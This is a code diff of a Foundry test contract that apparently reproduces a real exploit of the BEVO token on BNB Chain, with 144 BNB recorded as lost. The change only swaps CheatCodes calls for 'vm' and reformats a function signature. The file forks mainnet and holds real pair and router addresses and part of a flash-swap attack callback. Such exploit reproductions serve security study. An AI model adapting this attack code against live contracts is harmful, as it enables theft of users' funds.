@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // Total lost: 144 BNB
 // Frontrunner: https://bscscan.com/address/0xd3455773c44bf0809e2aeff140e029c632985c50
@@ -22,16 +21,15 @@ contract BEVOExploit is Test {
     IUniswapV2Pair private constant wbnb_usdc = IUniswapV2Pair(0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b);
     IUniswapV2Pair private constant bevo_wbnb = IUniswapV2Pair(0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633);
     IPancakeRouter private constant router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 25_230_702);
+        vm.createSelectFork("bsc", 25_230_702);
 
-        cheats.label(address(wbnb), "WBNB");
-        cheats.label(address(bevo), "BEVO");
-        cheats.label(address(wbnb_usdc), "PancakePair: WBNB-USDC");
-        cheats.label(address(bevo_wbnb), "PancakePair: BEVO-WBNB");
-        cheats.label(address(router), "PancakeRouter");
+        vm.label(address(wbnb), "WBNB");
+        vm.label(address(bevo), "BEVO");
+        vm.label(address(wbnb_usdc), "PancakePair: WBNB-USDC");
+        vm.label(address(bevo_wbnb), "PancakePair: BEVO-WBNB");
+        vm.label(address(router), "PancakeRouter");
     }
 
     function testExploit() external {
@@ -41,12 +39,9 @@ contract BEVOExploit is Test {
         emit log_named_decimal_uint("WBNB balance after exploit", wbnb.balanceOf(address(this)), 18);
     }
 
-    function pancakeCall(
-        address, /*sender*/
-        uint256, /*amount0*/
-        uint256, /*amount1*/
-        bytes calldata /*data*/
-    ) external {
+    function pancakeCall(address, /*sender*/ uint256, /*amount0*/ uint256, /*amount1*/ bytes calldata /*data*/ )
+        external
+    {
         address[] memory path = new address[](2);
         path[0] = address(wbnb);
         path[1] = address(bevo);
